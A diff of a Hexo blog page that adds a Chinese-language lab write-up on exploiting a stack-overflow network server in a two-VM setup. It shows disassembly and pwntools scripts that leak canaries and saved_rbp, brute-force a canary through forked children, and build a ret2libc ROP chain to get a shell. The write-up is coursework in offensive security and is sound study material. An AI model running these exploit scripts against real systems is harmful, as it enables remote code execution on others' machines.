@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | Hexo</title>
+  <title>测试测试 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="实验4+实验环境：由于在自己电脑上运行docker始终存在非常奇怪的且长时间未能解决的bug，所以决定更换实验环境，采用两个虚拟机，分别作为客户端和服务端。虽然更换了试验环境，但实验的核心内容和原理并没有改变，只是在一些细节上与原环境存在一点点差异。服务端环境:Ubuntu22.04;libc version:2.35。客户端环境:Linux kali 5.14.0;libc version:2.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="测试测试">
+<meta property="og:url" content="http://example.com/2024/01/16/%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="实验4+实验环境：由于在自己电脑上运行docker始终存在非常奇怪的且长时间未能解决的bug，所以决定更换实验环境，采用两个虚拟机，分别作为客户端和服务端。虽然更换了试验环境，但实验的核心内容和原理并没有改变，只是在一些细节上与原环境存在一点点差异。服务端环境:Ubuntu22.04;libc version:2.35。客户端环境:Linux kali 5.14.0;libc version:2.">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-01-16T06:38:45.000Z">
+<meta property="article:modified_time" content="2024-01-16T06:39:35.596Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -150,97 +154,174 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-测试测试" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      测试测试
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2024/01/16/%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95/" class="archive-article-date">
+
+        
+        <a href="/2024/01/16/%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95/" class="archive-article-date">
   	<time datetime="2024-01-16T06:38:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-16</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2024/01/16/%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95/">测试测试</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="实验4"><a href="#实验4" class="headerlink" title="实验4+"></a><center>实验4+</h2><h3 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h3><p>由于在自己电脑上运行docker始终存在非常奇怪的且长时间未能解决的bug，所以决定更换实验环境，采用两个虚拟机，分别作为客户端和服务端。虽然更换了试验环境，但实验的核心内容和原理并没有改变，只是在一些细节上与原环境存在一点点差异。<br>服务端环境:Ubuntu22.04;libc version:2.35。<br>客户端环境:Linux kali 5.14.0;libc version:2.36。</p>
+<h4 id="一-无任何安全防护"><a href="#一-无任何安全防护" class="headerlink" title="一.无任何安全防护"></a>一.无任何安全防护</h4><p>（1）使用GDB在server端communicate函数下断点，并跟踪子进程（将follow-fork-mode设置为child）。从client端发送任意数据，再在server端打印得到buf地址。<br><image src='15.png'><br>（2）查看communicate函数汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">400847:	55                   	push   %rbp</span><br><span class="line">400848:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">40084b:	48 83 ec 40          	sub    $0x40,%rsp</span><br><span class="line">char buf[MAX_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">recv(client_socket, buf, MAX_MSG_LEN, 0);    </span><br><span class="line">40084f:	8b 05 5b 08 20 00    	mov    0x20085b(%rip),%eax        # 6010b0 &lt;client_socket&gt;</span><br><span class="line">400855:	48 8d 75 c0          	lea    -0x40(%rbp),%rsi</span><br><span class="line">400859:	b9 00 00 00 00       	mov    $0x0,%ecx</span><br><span class="line">40085e:	ba 00 04 00 00       	mov    $0x400,%edx</span><br><span class="line">400863:	89 c7                	mov    %eax,%edi</span><br><span class="line">400865:	e8 26 fe ff ff       	callq  400690 &lt;recv@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>易知buf_size应为0x40,payload&#x3D;buf_size*’A’+rbp+ret_addr+shellcode。所以shellcode地址在buf_addr+0x50处。<br>将上述数据填入client.py并运行，成功拿到shell。<br><image src='16.png'></p>
+<h4 id="二-开启栈保护-Canary"><a href="#二-开启栈保护-Canary" class="headerlink" title="二.开启栈保护(Canary)"></a>二.开启栈保护(Canary)</h4><p>（1）同样使用第一关中的方法得到buf地址：<br><image src='17.png'><br>（2）查看汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4008b7:	55                   	push   %rbp</span><br><span class="line">  4008b8:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  4008bb:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">  4008bf:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  4008c6:	00 00 </span><br><span class="line">  4008c8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">  4008cc:	31 c0                	xor    %eax,%eax</span><br><span class="line">  char buf[MAX_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">  recv(client_socket, buf, MAX_MSG_LEN, 0);    </span><br><span class="line">  4008ce:	8b 05 ec 07 20 00    	mov    0x2007ec(%rip),%eax        # 6010c0 &lt;client_socket&gt;</span><br><span class="line">  4008d4:	48 8d 75 b0          	lea    -0x50(%rbp),%rsi</span><br></pre></td></tr></table></figure>
+<p>可知canary在rbp-0x8处，buf在rbp-0x50处。所以payload&#x3D;0x48*’A’+canary+rbp+ret_addr+shellcode。<br>shellcode地址为buf_addr+0x60。<br>（3）获取canary：<br>可以通过communicate中的send函数获取canary，将canary前的内容覆盖为非\x00的值，即可拿到canary。由于64位下canary最低位为\x00，所以需要覆盖0x48+1个字节。payload&#x3D;0x49*’A’。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buf_size = 0x49</span><br><span class="line">buf_data = b&quot;A&quot; * buf_size</span><br><span class="line">payload = buf_data</span><br><span class="line">r = pwn.remote(&quot;192.168.78.130&quot;, 1988)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(payload)</span><br><span class="line">canary = pwn.u64(b&quot;\x00&quot; + r.recv(7))</span><br><span class="line">print(&quot;canary:&quot; ,hex(canary))</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
+<p>（4）发送（2）中分析得到的payload即可拿到shell。<br><image src='18.png'></p>
+<h4 id="三-开启栈保护-Canary-地址随机化-ASLR"><a href="#三-开启栈保护-Canary-地址随机化-ASLR" class="headerlink" title="三.开启栈保护(Canary)+ 地址随机化(ASLR)"></a>三.开启栈保护(Canary)+ 地址随机化(ASLR)</h4><p>（1）打印栈上buf附近的内容：<br><image src='19.png'><br>可以发现old_rbp&#x3D;buf_addr-0x60。所以可以通过获取old_rbp地址间接得到buf_addr。<br>（2）与第二关获取canary的代码大致相同，只不过这一次还需要获取old_rbp。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">buf_size = 0x49</span><br><span class="line">    buf_data = b&quot;A&quot; * buf_size</span><br><span class="line">    payload = buf_data</span><br><span class="line">    r = pwn.remote(&quot;192.168.132.128&quot;, 1988)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.recvuntil(payload)</span><br><span class="line">    canary = pwn.u64(b&quot;\x00&quot; + r.recv(7))</span><br><span class="line">    print(&quot;canary: %x\n&quot; % canary)</span><br><span class="line">    canary = pwn.p64(canary)</span><br><span class="line">    saved_rbp = pwn.u64(r.recv(6) + b&quot;\x00\x00&quot;)</span><br><span class="line">    print(&quot;saved_rbp: %x\n&quot; % saved_rbp)</span><br><span class="line">    buf_addr = saved_rbp - 0x60</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure>
+<p>（3）后续攻击过程同第二关，略。<br><image src='19.png'></p>
+<h4 id="四-开启栈保护-Canary-地址随机化-ASLR-栈不可执行-NonExec"><a href="#四-开启栈保护-Canary-地址随机化-ASLR-栈不可执行-NonExec" class="headerlink" title="四.开启栈保护(Canary)+ 地址随机化(ASLR) + 栈不可执行(NonExec)"></a>四.开启栈保护(Canary)+ 地址随机化(ASLR) + 栈不可执行(NonExec)</h4><p>由于栈不可执行，那么不能使用在栈上注入shellcode的方法。<br>（1）首先同样是获取canary，脚本同第二关，略。<br>（2）通过libc_start_main的地址获取libc中system和binsh字符串地址。由于更换了实验环境，libc版本也有变化，所以选择使用工具LibcSearcher帮助计算system函数和bin_sh字符串的地址。<br>首先在main函数下断点，运行停止后查看main函数的返回地址，发现并非libc_start_main的地址，而是__libc_start_call_main函数中，与__libc_start_main地址低0x30，所以接收到的地址还要再加0x30才得到__libc_start_main的地址。然后利用libcsearcher即可找到system和binsh的地址了。<br><image src='21.png'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">buf_size = 0x68</span><br><span class="line">buf_data = b&quot;A&quot; * buf_size</span><br><span class="line">payload = buf_data</span><br><span class="line">r = pwn.remote(ip, 1988)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(payload)</span><br><span class="line">ret_addr_libc = pwn.u64(r.recv(6) + b&quot;\x00\x00&quot;)</span><br><span class="line">ret_addr_libc+=0x30</span><br><span class="line">print(hex(ret_addr_libc))</span><br><span class="line">libc=LibcSearcher(&#x27;__libc_start_main&#x27;,ret_addr_libc)</span><br><span class="line">base=ret_addr_libc-libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">sys=base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">print(&quot;ret_addr_libc: %x\n&quot; % ret_addr_libc)</span><br><span class="line">print(&quot;binsh_str_addr: %x\n&quot; % bin_sh)</span><br><span class="line">print(&quot;system_addr: %x\n&quot; % sys)</span><br></pre></td></tr></table></figure>
+<p>（3）构造<code>payload=buf_data+canary+old_rbp+single_ret+pop_rdi+bin_sh_addr+system_addr</code>。<br>其中buf_data+canary+old_rbp无需多言，single_ret是为了栈对齐，64位下system函数需要16字节对齐。pop_rdi_ret是传参，因为64位下函数第一个参数通过rdi寄存器传递。<br>single_ret和pop_rdi_ret的地址通过ropper工具查找得到。<br><image src='23.png'><br><image src='24.png'><br>运行脚本成功拿到shell。<br><image src='22.png'></p>
+<h4 id="五-实验二中，将communicate函数中的send注释掉。"><a href="#五-实验二中，将communicate函数中的send注释掉。" class="headerlink" title="五.实验二中，将communicate函数中的send注释掉。"></a>五.实验二中，将communicate函数中的send注释掉。</h4><p>实现原理:fork得到的字进程canary和父进程相同，所以可以反复连接server端，让其创建子进程，进而逐位爆破canary。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">buf_size = 0x48</span><br><span class="line">buf_data = b&quot;A&quot; * buf_size</span><br><span class="line">canary=b&#x27;\x00&#x27; #canary第一位一定是\x00</span><br><span class="line">for i in range(7): #爆破canary后七位</span><br><span class="line">    for j in range(256):</span><br><span class="line">        payload=buf_data+canary+j.to_bytes(1,&#x27;little&#x27;)</span><br><span class="line">        r = pwn.remote(&quot;192.168.253.128&quot;,1988)</span><br><span class="line">        r.send(payload)</span><br><span class="line">        try:</span><br><span class="line">            a=r.recv()</span><br><span class="line">            #如果有接收到父进程的success，说明canary正确。</span><br><span class="line">            if b&#x27;Success&#x27; in a:</span><br><span class="line">                print(a)</span><br><span class="line">                canary+=j.to_bytes(1,&#x27;little&#x27;)</span><br><span class="line">                r.close()</span><br><span class="line">                break</span><br><span class="line">        except EOFError:</span><br><span class="line">            r.close()</span><br><span class="line">            pass</span><br><span class="line">        r.close()</span><br></pre></td></tr></table></figure>
+<p>运行拿到shell。<br><image src='25.png'></p>
+<h4 id="六-思考题"><a href="#六-思考题" class="headerlink" title="六.思考题"></a>六.思考题</h4><p>（1）实验1中，如何获得buf的固定地址？<br>已在第一关中说明。<br>（2）实验2中，获得canary值的步骤为何需要填充0x49个字节，而不是0x48个字节？<br>因为64位下canary最低位是\x00，如果不将它覆盖掉，那么send函数就会在此截断，无法获取canary。<br>（3）实验3中，获得saved_rbp值的步骤在什么情况下会失败？<br>原理同上，如果saved_rbp有一个字节是\x00的话就会失败。<br>（4）实验4中，为何在pop_rdi_gadget之前需要有ret_gadget？如果去掉ret_gadget会发生什么？<br>原因已在第四关说明，如果去掉canary将会导致system调用失败。<br>（5）实验4中，能否不用no-pie编译选项？<br>pie是一种生成地址无关可执行程序的技术如果开启了pie那么，可执行程序的地址将变得随机，pop_rdi_ret和single_ret地址都将不可确定，因此实验无法成功。</p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2024/01/16/%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2024/01/16/test/" class="archive-article-date">
-  	<time datetime="2024-01-16T04:54:43.476Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-16</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2024/01/16/hello-world/" class="archive-article-date">
-  	<time datetime="2024-01-16T04:50:33.327Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-16</time>
-</a>
-        </div>
-    	 
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2024/01/16/hello-world/">Hello World</a>
-    </h1>
+  
+    <a href="/2024/01/16/test/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -263,8 +344,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
